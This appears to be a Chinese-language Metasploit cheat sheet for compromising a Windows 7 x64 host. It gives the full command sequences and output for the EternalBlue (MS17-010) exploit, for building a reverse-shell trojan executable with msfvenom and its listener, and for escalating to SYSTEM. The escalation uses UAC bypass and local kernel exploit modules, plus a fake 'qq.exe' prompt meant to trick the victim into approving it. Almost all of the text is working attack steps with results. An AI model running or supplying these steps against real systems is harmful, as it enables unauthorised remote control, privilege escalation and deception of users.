# 渗透win7 64位 计算机

## msfconsole
```
# msfdb run
-- 查找永恒之蓝相关的模块
# search ms17_010
-- 使用辅助模块进行扫描
# use auxiliary/scanner/smb/smb_ms17_010
-- 设置目标主机ip
# set rhosts 192.168.1.10
# run
## 结果:
		[+] 192.168.1.10:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
		[*] 192.168.1.10:445      - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed
# back
-- 使用攻击模块
# use exploit/windows/smb/ms17_010_eternalblue
-- 设置kali的ip和端口
# set lhost 192.168.1.53
# set lport 4444
-- 设置目标机的ip
# set rhosts 192.168.1.10
-- 开始执行
# run
-- 拿到系统权限
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
-- 保存会话至后台
# background
```

## search常见用法
```
-- Cve指定平台Exp漏洞搜索搭配参数如下：
# msf6 > grep windows search cve:2021

searchExamples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```


## msf生成exe木马

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -f exe -o /var/www/html/msf.exe
-p    指定攻击载客
lhost 指定攻击端的ip
lport 指定攻击端的端口
-f    指定文件类型
-o    指定输出目录
```

## kali

```
# use exploit/multi/handler
# set payload windows/x64/meterpreter/reverse_tcp
# set lhost 192.168.1.53
# set lport 4444
# run
```


## exploit/windows/local/ask 给会话提权
## 提高程序运行级别
### .Msf模块 - Exploit/windows/local/ask

```
-- 提权之前
msf6 exploit(windows/local/ask) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: This function is not supported on this system. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)


-- 加载模块
# use exploit/windows/local/ask
-- 查看模块的作用
# info
# 结果 :
  Description:
  This module will attempt to elevate execution level using the 
  ShellExecute undocumented RunAs flag to bypass low UAC settings.
-- 设置会话
# set session 9
-- 设置执行的文件名(给目标机用户看)
# set filename qq.exe
# run

## 对方计算机会出现一个弹窗 提示是否运行qq,当用户点击是,我们就再次拿到了一个会话

--msf6 exploit(windows/local/ask) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                Connection
  --  ----  ----                     -----------                ----------
  1         meterpreter x86/windows  faker-PC\faker @ faker-PC  192.168.1.53:4444 -> 192.168.1.10:49325  (192.168.1.10)
  2         meterpreter x86/windows  faker-PC\faker @ faker-PC  192.168.1.53:4444 -> 192.168.1.10:49326  (192.168.1.10)


-- 此时进入第二个会话,就可以进行提权操作了
# session -i 2
# meterpreter > getuid
# Server username: faker-PC\faker
# meterpreter > getsystem 
# ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

-- 此时获得管理员权限

```

## UAC绕过
```
· uAc绕过
 Msf模块
 Exploit/windows/local/bypassuac
 Exploit/windows/local/bypassuac_injection Exploit/windows/local/bypassuac_vbs


start:
	# use exploit/windows/local/bypassuac
	-- 需要提权的会话
	# set session 1
	# run

-- 完事:
	meterpreter > getuid
	Server username: faker-PC\faker
	meterpreter > getsystem
	...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

```


## 利用漏洞提权
```
# 利用提权漏洞进行提权
# exploit/windows/local/ms14_058_track_popup_menu
# exploit/windows/local/ms16_016_webdav

start:
	# use exploit/windows/local/ms14_058_track_popup_menu
	# set session 1
	# run

```

## 查看编码类型 msfvenom -l encoders
